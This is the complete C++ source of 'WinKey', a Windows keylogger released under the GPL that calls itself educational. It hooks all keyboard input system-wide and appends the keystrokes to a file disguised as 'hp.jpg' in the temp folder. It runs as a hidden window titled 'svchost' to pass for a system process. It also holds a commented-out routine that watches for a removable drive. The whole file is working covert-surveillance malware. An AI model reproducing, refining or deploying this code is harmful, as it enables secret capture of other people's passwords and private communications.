/*
 * WinKey -- A GPL Windows keylogging program. While this program can potentially
 * be used for nefarious purposes, it was written for educational and recreational
 * purposes only and the author does not endorse illegal use.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <fstream>
#include <iostream>
#include <string>
#include <windows.h>

#include <stdio.h>
#include <time.h>
using namespace std;

string allDrives;


//#define	DEBUG	1

#define OUTFILE_NAME	"hp.jpg"	/* Output file */
#define CLASSNAME	"winkey"
#define WINDOWTITLE	"svchost"

char getRemovableDisk();
char	windir[MAX_PATH + 1];
char	temp[MAX_PATH + 1];
HHOOK	kbdhook;	/* Keyboard hook handle */
bool	running;	/* Used in main loop */

/**
 * \brief Called by Windows automagically every time a key is pressed (regardless
 * of who has focus)
 */
__declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp)
{
	if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) {
		static bool capslock = false;
		static bool shift = false;
		char tmp[0xFF] = {0};
		std::string str;
		DWORD msg = 1;
		KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp);
		bool printable;

		/*
		 * Get key name as string
		 */
		msg += (st_hook.scanCode << 16);
		msg += (st_hook.flags << 24);
		GetKeyNameText(msg, tmp, 0xFF);
		str = std::string(tmp);

		printable = (str.length() <= 1) ? true : false;

		/*
		 * Non-printable characters only:
		 * Some of these (namely; newline, space and tab) will be
		 * made into printable characters.
		 * Others are encapsulated in brackets ('[' and ']').
		 */
		if (!printable) {
			/*
			 * Keynames that change state are handled here.
			 */
			if (str == "CAPSLOCK")
				capslock = !capslock;
			else if (str == "SHIFT")
				shift = true;

			/*
			 * Keynames that may become printable characters are
			 * handled here.
			 */
			if (str == "ENTER") {
				str = "\n";
				printable = true;
			} else if (str == "SPACE") {
				str = " ";
				printable = true;
			} else if (str == "TAB") {
				str = "\t";
				printable = true;
			} else {
				str = ("[" + str + "]");
			}
		}

		/*
		 * Printable characters only:
		 * If shift is on and capslock is off or shift is off and
		 * capslock is on, make the character uppercase.
		 * If both are off or both are on, the character is lowercase
		 */
		if (printable) {
			if (shift == capslock) { /* Lowercase */
				for (size_t i = 0; i < str.length(); ++i)
					str[i] = tolower(str[i]);
			} else { /* Uppercase */
				for (size_t i = 0; i < str.length(); ++i) {
					if (str[i] >= 'A' && str[i] <= 'Z') {
						str[i] = toupper(str[i]);
					}
				}
			}

			shift = false;
		}

#ifdef DEBUG
		std::cout << str;
#endif
	    //std::string getexepath();
		//std::string path = std::string(windir) + "\\" + OUTFILE_NAME;
		std::string path = std::string(temp) + "\\" + OUTFILE_NAME;
		//std::string path =OUTFILE_NAME;
		std::ofstream outfile(path.c_str(), std::ios_base::app);
		if (str != "[Freccia SINISTRA]" && str !="[Freccia DESTRA]" && str !="[Freccia SU]" && str !="[Freccia GIÙ]" 
		&& str !="[PGGIÙ]"
		&& str !="[PGSU]"
		&& str !="[BACKSPACE]" && str !="[BARRA SPAZIATRICE]") 
		outfile << str;
		outfile.close();
	}

	return CallNextHookEx(kbdhook, code, wp, lp);
}
/*std::string getexepath()
{
  char result[ MAX_PATH ];
  return std::string( result, GetModuleFileName( NULL, result, MAX_PATH ) );
}
*/
/**
 * \brief Called by DispatchMessage() to handle messages
 * \param hwnd	Window handle
 * \param msg	Message to handle
 * \param wp
 * \param lp
 * \return 0 on success
 */
LRESULT CALLBACK windowprocedure(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
	switch (msg) {
		case WM_CLOSE: case WM_DESTROY:
			running = false;
			break;
		default:
			/* Call default message handler */
			return DefWindowProc(hwnd, msg, wp, lp);
	}

	return 0;
}

int WINAPI WinMain(HINSTANCE thisinstance, HINSTANCE previnstance,
		LPSTR cmdline, int ncmdshow)
{

	/*
	 * Set up window
	 */
	HWND		hwnd;
	HWND		fgwindow = GetForegroundWindow(); /* Current foreground window */
	MSG		msg;
	WNDCLASSEX	windowclass;
	HINSTANCE	modulehandle;

	windowclass.hInstance = thisinstance;
	windowclass.lpszClassName = CLASSNAME;
	windowclass.lpfnWndProc = windowprocedure;
	windowclass.style = CS_DBLCLKS;
	windowclass.cbSize = sizeof(WNDCLASSEX);
	windowclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	windowclass.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
	windowclass.hCursor  = LoadCursor(NULL, IDC_ARROW);
	windowclass.lpszMenuName = NULL;
	windowclass.cbClsExtra = 0;
	windowclass.cbWndExtra = 0;
	windowclass.hbrBackground = (HBRUSH)COLOR_BACKGROUND;

	if (!(RegisterClassEx(&windowclass)))
		return 1;

	hwnd = CreateWindowEx(NULL, CLASSNAME, WINDOWTITLE, WS_OVERLAPPEDWINDOW,
			CW_USEDEFAULT, CW_USEDEFAULT, 640, 480, HWND_DESKTOP, NULL,
			thisinstance, NULL);
	if (!(hwnd))
		return 1;

	/*
	 * Make the window invisible
	 */
#ifdef DEBUG
	/*
	 * Debug mode: Make the window visible
	 */
	ShowWindow(hwnd, SW_SHOW);
#else
	ShowWindow(hwnd, SW_HIDE);
#endif
	UpdateWindow(hwnd);
	SetForegroundWindow(fgwindow); /* Give focus to the previous fg window */

	/*
	 * Hook keyboard input so we get it too
	 */
	modulehandle = GetModuleHandle(NULL);
	kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)handlekeys, modulehandle, NULL);

	running = true;

	GetWindowsDirectory((LPSTR)windir, MAX_PATH);
	GetTempPath( MAX_PATH,(LPSTR)temp);
	/*
	 * Main loop
	 */
	while (running) {
		/*
		 * Get messages, dispatch to window procedure
		 */
/*		char driveLetter = getRemovableDisk();
		while(1){
        driveLetter = getRemovableDisk();
        if(driveLetter=='F'){
            printf("%c \n", driveLetter);
        }

        Sleep(1000);
    	}
*/		if (!GetMessage(&msg, NULL, 0, 0))
			running = false; /*
					  * This is not a "return" or
					  * "break" so the rest of the loop is
					  * done. This way, we never miss keys
					  * when destroyed but we still exit.
					  */
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}
char getRemovableDisk(){
    char drive='0';

    char szLogicalDrives[MAX_PATH];
    DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, szLogicalDrives);
	
    string currentDrives="";

    //cout << dwResult << endl;
    for(int i=0; i<dwResult; i++)
    {
        if(szLogicalDrives[i]>64 && szLogicalDrives[i]< 90)
        {
        	
            currentDrives.append(1, szLogicalDrives[i]);

            if(allDrives.find(szLogicalDrives[i]) > 100)
            {
                drive = szLogicalDrives[i];
                
                if (drive=='F')
                	return drive;	
            }
        }
    }
    
}
